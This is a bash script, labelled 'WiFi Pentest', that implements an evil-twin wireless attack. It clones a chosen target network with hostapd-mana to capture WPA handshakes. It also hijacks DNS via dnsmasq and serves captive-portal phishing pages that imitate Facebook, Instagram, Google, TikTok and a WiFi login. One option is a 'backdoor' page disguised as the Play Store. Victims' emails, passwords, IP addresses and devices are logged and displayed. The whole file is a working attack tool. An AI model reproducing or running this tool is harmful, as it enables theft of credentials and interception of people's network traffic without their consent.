#!/bin/bash

# Colors
nc="\e[0m"       # No color
green="\e[1;32m"   # Green
red="\e[1;31m"     # Red
yellow="\e[1;33m"  # Yellow
white="\e[1;97m"   # White
black='\e[1;30m'
blue='\e[1;34m'
magenta='\e[1;35m'
cyan='\e[1;36m'

######Global Var######
#target info
target2attack=;
NameTarget2attack=;
ChaTarget2attack=;
BssidTarget2attack=;

#captive info
choiced_site=;
serverName=;

#logger Var
ls .tmp > /dev/null || mkdir .tmp
ls databases > /dev/null || mkdir databases;
fcsv="/var/www/portal/$choiced_site/logger.csv";
fhtml="/var/www/portal/$choiced_site/logger.html";

#config of hostapd-mana
config_one=$(mktemp --suffix=".conf" --tmpdir=".");

#config of dnsmasq
config_two=$(mktemp --suffix=".conf" --tmpdir=".");

#config of hostapd
config_three=$(mktemp --suffix=".conf" --tmpdir=".");

iee80211n=1;
password=;
save_hs_name=;
hs_path=;
wifi_pass=;
interface="wlan0";
wifi_info=$(mktemp --suffix=".txt" --tmpdir=".");
target_list=$(mktemp --suffix=".csv" --tmpdir=".");



check(){
		which apache2 > /dev/null && echo "OK"|| echo "Not Found";
		sleep 1;
		which hostapd > /dev/null && echo "OK"|| echo "Not Found";
		sleep 1;
		which hostapd-mana > /dev/null && echo "OK"|| echo "Not Found";
		sleep 1;
		which a2enmod > /dev/null && echo "OK"|| echo "Not Found";
		sleep 1;
		which nft > /dev/null && echo "OK"|| echo "Not Found";
		sleep 1;
		which dnsmasq > /dev/null && echo "OK"|| echo "Not Found";
		sleep 1;
		which iwlist > /dev/null && echo "OK"|| echo "Not Found";
}

banner(){
	echo "WiFi Pentest";
}

#reconnaissance  Part Function
monitor_wifi(){
	while true; do
		clear
		iwlist  wlan0 scanning | grep "SSID\|Channel:\|dBm\|Address" > $wifi_info;
		cat $wifi_info | grep "SSID\|Channel:\|dBm";
		read -t 2 -n 1 -p "To Exit Press e" key;
		if [ $key == "e" ];then
			clear;
			break;
		fi
	done
	#creating csv file
	echo "id,bssid,channel,name" > $target_list;
	target=$(echo "$(cat $wifi_info | grep "Address" | cut -d "-" -f2 | cut -d ":" -f2-7)" | tr -cd ' ' | wc -c)
	for((i=1; i <= $target;i++));do
		BSSID=$(echo $(cat $wifi_info | grep "Address" | cut -d "-" -f2 | cut -d ":" -f2-7) | cut -d " " -f$i);
		CHANNEL=$(echo $(cat $wifi_info | grep "Channel" | cut -d ":" -f2) | cut -d " " -f$i);
		ESSID=$(echo $(cat $wifi_info | grep "ESSID" | cut -d ":" -f2) | cut -d '"' -f$(($i+$i)));
		echo "$i,$BSSID,$CHANNEL,$ESSID" >> $target_list;
	done
}

target(){
	clear;
	#printing Target
	haveTarget=$(wc -l $target_list | cut -d " " -f1);
	if [ true ];then
		local first_line=true;
		echo -e $yellow"ID\tName\t\t\t\tBSSID\t\t\tChannel"$white
		while IFS=',' read -r id bssid channel name; do
		#skiping First line
			if [ "$first_line" = true ]; then 
      			first_line=false
      			continue
    		fi
    		echo -e "$blue$id\t$name\t\t\t$bssid\t$channel$white";
  		done < $target_list
		#Selecting Target
		havePassword=;
		read -p "Enter Target ID to Attack: " target_id;
		read -p "Insert Password? [y/n] default [n]: " havePassword;
		if [ "$havePassword" == "y" ];then
			read -p "Password For Target : " password;
		else
			password=;
		fi
		target2attack=$(sed -n "$(($target_id+1))p" $target_list);
		NameTarget2attack=$(echo $target2attack | cut -d "," -f4);
		ChaTarget2attack=$(echo $target2attack | cut -d "," -f3);
		BssidTarget2attack=$(echo $target2attack | cut -d "," -f2);
		save_hs_name=$NameTarget2attack.hccapx;
		hs_path="$(pwd)/$save_hs_name";
		ls /var/www/portal/wifi/ > /dev/null && echo $NameTarget2attack > /var/www/portal/wifi/target;
	fi
}

#Main Recon function
recon(){
	while true; do
		# clear;
		echo -e $yellow"Select an option:$white"
		echo "1. Monitor WiFi"
		echo "2. Confirm Target"
		echo "3. Back To Main"

		# Read user choice
		read -p "Enter your choice (1-3): " option

		# Case statement for user choice
		case $option in
		  1) 
		    monitor_wifi;
		    ;;
		  2)
		    target
		    ;;
		  3)
			clear;
		    break;
		    ;;
		  *)
		    echo "Invalid option. Please select a valid option (1-4)."
		    ;;
		esac
	done
}



apache_conf(){
	#backing original file
	mv /etc/apache2/sites-enabled/000-default.conf /etc/apache2/sites-enabled/000-default.conf.bak || echo 0 > /dev/null;

	#creating apache config file
	echo -e "<VirtualHost *:80>" > 000-default.conf;
	# echo -e "\tServerName $serverName" >> 000-default.conf;
	echo -e "\tServerAdmin webmaster@localhost" >> 000-default.conf;
	echo -e "\tDocumentRoot /var/www/portal/$choiced_site" >> 000-default.conf;
	echo -e "" >> 000-default.conf;
	echo -e "\t#Android" >> 000-default.conf;
	echo -e "\tRedirectMatch 302 /generate_204 http://192.168.87.1/index.php" >> 000-default.conf;
	# echo -e "" >> 000-default.conf;
	# echo -e "\t# Apple" >> 000-default.conf;
	# echo -e "\tRewriteEngine on" >> 000-default.conf;
	# echo -e "\tRewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]" >> 000-default.conf;
	# echo -e "\tRewriteCond %{HTTP_HOST} !^192.168.87.1$" >> 000-default.conf;
	# echo -e "\tRewriteRule ^(.*)$ http://192.168.87.1/index.php [L,R=302]" >> 000-default.conf;
	echo -e "" >> 000-default.conf;
	# echo -e "\t# Windows 7 and 10" >> 000-default.conf;
	# echo -e "\tRedirectMatch 302 /ncsi.txt http://192.168.87.1/index.php" >> 000-default.conf;
	# echo -e "\tRedirectMatch 302 /connecttest.txt http://192.168.87.1/index.php" >> 000-default.conf;
	# echo -e "" >> 000-default.conf;
	echo -e "\t# Catch-all rule to redirect other possible attempt" >> 000-default.conf;
	echo -e "\tRewriteCond %{REQUEST_URI} !\^/portal/ [NC]" >> 000-default.conf;
	echo -e "\tRewriteRule ^(.*)$ http://192.168.87.1/index.php" >> 000-default.conf;
	echo -e "\tErrorLog \${APACHE_LOG_DIR}/error.log" >> 000-default.conf;
	echo -e "\tCustomLog \${APACHE_LOG_DIR}/access.log combined" >> 000-default.conf;
	echo -e "</VirtualHost>" >> 000-default.conf;

	mv 000-default.conf /etc/apache2/sites-enabled/;

	#update apache2 config
	a2enmod rewrite;
	a2enmod alias;
	systemctl restart apache2;
	a2enmod ssl;

	mv /var/log/apache2/access.log /var/log/apache2/access.bak;
	touch /var/ /var/log/apache2/access.log;


	#apache2 service
	systemctl stop apache2.service;
	systemctl start apache2.service;
}


handshake(){
	#create hostapd-mana config
	echo "interface=$interface" > $config_one;
	echo "ssid=$NameTarget2attack" >> $config_one;
	echo "channel=$ChaTarget2attack" >> $config_one;
	echo "ieee80211n=$iee80211n" >> $config_one;
	echo "hw_mode=g" >> $config_one;
	echo "wpa=3" >> $config_one;
	echo "wpa_key_mgmt=WPA-PSK" >> $config_one;
	echo "wpa_passphrase=ANYPASSWORD" >> $config_one;
	echo "wpa_pairwise=TKIP CCMP" >> $config_one;
	echo "rsn_pairwise=TKIP CCMP" >> $config_one;
	echo "mana_wpaout=$hs_path" >> $config_one;

	#start evil-twin
	hostapd-mana $config_one;

}
dnserver(){
	#create dns configure
	echo "domain-needed" >> $config_two;
	echo "bogus-priv" >> $config_two;
	echo "no-resolv" >> $config_two;
	echo "filterwin2k" >> $config_two;
	echo "expand-hosts" >> $config_two;
	echo "domain=localdomain" >> $config_two;
	echo "local=/Localdomain/" >> $config_two;
	echo "listen-address=192.168.87.1" >> $config_two;
	echo "dhcp-range=192.168.87.100,192.168.87.199,12h" >> $config_two;
	echo "dhcp-lease-max=100" >> $config_two;
	echo "address=/com/192.168.87.1" >> $config_two;
	echo "address=/org/192.168.87.1" >> $config_two;
	echo "address=/net/192.168.87.1" >> $config_two;
	echo "address=/dns.msftncsi.con/131.107.255.255" >> $config_two;

	#start dns server
	dnsmasq --conf-file=$config_two;

}
captiveportal(){
	echo "work";
	hostapd -B $config_three;
	while true;do
	clear;
	watch -n1 tail /var/log/apache2/access.log;
	read -t 3 -n 1 -p "To Exit Press e\nTo View Information Press i" key;
	InfoMonitor;
		if [ "$key" == "e" ];then
			#stop AP
			kill $(pidof hostapd);

			#data expord
			cat /var/www/portal/$choiced_site/logger.html >> databases/record.html && rm /var/www/portal/$choiced_site/logger.html;
			cat /var/www/portal/$choiced_site/logger.csv >> databases/record.csv && rm /var/www/portal/$choiced_site/logger.csv;
			clear;
			break;
		elif [ "$key" == "i" ];then
			clear;
			InfoMonitor;
			read -p "To Exit Press Enter" enter1;
		fi
	done
}

InfoMonitor(){
	echo -e $yellow"Email\tPassword\tIP Address\tDevice$white";
	while IFS=',' read -r email pass ip useragent time; do
		agent=$(echo $useragent | grep -oP '\(([^)]+)\)' | head -n 1);
		echo -e "$magenta$email\t$pass\t$blue$ip\t$red$agent$white";
  	done < /var/www/portal/$choiced_site/logger.csv;
}

# LogMonitor(){

# }


portalPannel(){

	#hostapd conf
	echo "interface=$interface" > $config_three;
	echo "ssid=$NameTarget2attack" >> $config_three;
	echo "channel=$ChaTarget2attack" >> $config_three;
	echo "ieee80211n=$iee80211n" >> $config_three;
	if [ "$password" ];then
		echo "wpa=3" >> $config_three;
		echo "wpa_key_mgmt=WPA-PSK" >> $config_three;
		echo "wpa_passphrase=8888899999" >> $config_three;
		echo "wpa_pairwise=TKIP CCMP" >> $config_three;
		echo "rsn_pairwise=TKIP CCMP" >> $config_three;
	fi

	# echo "hw_mode=g" >> $config_three;

	pidof dnsmasq || dnserver;
	ls /var/www/portal > /dev/null || cp -r portal /var/www/ && chown -R www-data:www-data /var/www/portal;
	echo $NameTarget2attack > /var/www/portal/wifi/target


	#ip adding
	ip addr add 192.168.87.1/24 dev $interface;
	ip link set $interface up;

	#rule assing
	nft add table ip nat;
	nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }';
	nft add rule ip nat PREROUTING iifname "$interface" udp dport 53 counter redirect to :53;


	while true;do
	rm /var/ /var/log/apache2/access.log || echo 0 > /dev/null;
	mv /var/log/apache2/access.bak /var/log/apache2/access.log || echo 0 > /dev/null;
	clear;
	echo -e "\e[1m\e[4;33mAbiliable Site Lists\e[0m"
  	echo -e "\e[1m\e[33m[1]\e[1;34m \e[1mFacebook\e[0m"
  	echo -e "\e[1m\e[33m[2]\e[1;34m \e[1mInstagram\e[0m"
  	echo -e "\e[1m\e[33m[3]\e[1;34m \e[1mWifi\e[0m"
  	echo -e "\e[1m\e[33m[4]\e[1;34m \e[1mPayload\e[0m"
  	echo -e "\e[1m\e[33m[5]\e[1;34m \e[1mGoogle\e[0m"
  	echo -e "\e[1m\e[33m[6]\e[1;34m \e[1mTiktok\e[0m"
  	echo -e "\e[1m\e[33m[7]\e[1;34m \e[1mFacebook Security\e[0m"
  	echo -e "\e[1m\e[33m[8]\e[1;34m \e[1mBack\e[0m"
	read -p "Enter your choice (1-8): " option;
	case $option in
		1)
			choiced_site=facebook;
			serverName=www.facebook.com;
			;;
		2)
			choiced_site=instagram;
			serverName=www.instagram.com;
			;;
		3)
			choiced_site=wifi;
			serverName="$NameTarget2attack.com";
			;;
		4)	
			choiced_site=backdoor;
			serverName=playstore.google.com;
			;;
		5)
			choiced_site=google;
			serverName=www.google.com;
			;;
		6)
			choiced_site=tiktok;
			serverName=www.tiktok.com;
			;;
		7)
			choiced_site=fb-security;
			serverName=www.facebook.com;
			;;
		8)
			clear;
			rm /etc/apache2/sites-enabled/000-default.conf;
			mv /etc/apache2/sites-enabled/000-default.conf.bak /etc/apache2/sites-enabled/000-default.conf;
			kill $(pidof dnsmasq);
			service apache2 stop;
			break;
			;;
		*)
			echo "Invalid option. Please select a valid option (1-8)."
			;;
	esac

	apache_conf;
	captiveportal;
	echo "in loop";
	done;#end of while loop
}

controlPanel(){
	monitor_wifi;
	target;
	clear;
	while true; do
	  	echo -e $yellow"Select an option:$white"
	  	echo -e "1. Recon"
	  	echo -e "2. Handshake"
	  	echo -e "3. Captive Portal"
	  	echo -e "4. Exit"

	  	read -p "Enter your choice (1-4): " option

	  	case $option in
	  	  1)	
			recon;
			;;
	  	  2)	
		  		handshake
			    ;;
	  	  3)
	  	    portalPannel;

	  	    ;;
	  	  4)
	  	    echo "Exiting the script. Goodbye!"
			rm ./tmp.*;
	  	   	exit 0
	  	  	;;
	  	  *)
	  	    echo "Invalid option. Please select a valid option (1-4)."
	  	    ;;
	  	esac
	done
}

main(){
	banner;
	controlPanel;


}

main $@



